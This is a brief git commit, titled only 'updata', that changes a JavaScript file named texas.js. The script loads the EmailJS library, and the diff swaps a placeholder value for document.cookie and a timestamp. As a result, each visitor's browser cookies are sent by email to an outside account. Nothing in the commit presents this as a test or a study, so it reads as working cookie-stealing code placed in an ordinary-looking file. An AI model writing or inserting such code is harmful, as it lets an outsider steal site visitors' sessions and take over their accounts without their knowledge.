ab9b630d1c890c455dd6700a82e132c0f29b819a
amayanuwanthi <amaya.nuwanthi.96@gmail.com>
2017-05-24 14:51:08 +0530

    updata

--- texas.js
+++ texas.js
@@ -3,6 +3,6 @@ $.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
   (function(){
       emailjs.init("user_v53jGOfDqJGNImD25jUpw");
    })();
-     emailjs.send("gmail","data",{cookie: "James", time: "2017-5-24"});
+     emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime()});
 });
 //
